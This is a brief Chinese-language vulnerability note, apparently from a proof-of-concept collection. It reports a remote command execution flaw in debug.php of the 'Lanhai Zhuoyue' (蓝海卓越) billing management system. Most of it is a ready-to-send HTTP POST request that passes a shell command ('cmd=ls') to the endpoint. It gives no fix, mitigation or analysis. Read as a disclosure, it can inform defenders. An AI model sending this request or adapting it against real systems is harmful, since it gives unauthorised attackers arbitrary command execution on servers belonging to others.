## 蓝海卓越计费管理系统存在debug.php远程命令执行漏洞

蓝海卓越计费管理系统存在debug.php远程命令执行漏洞

## poc

```
POST /debug.php?_t=0.297317996068593 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 12
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=n8n03vmefnnrejq35697pbivl6
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest

cmd=ls
```

![image-20240525134604450](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405251346523.png)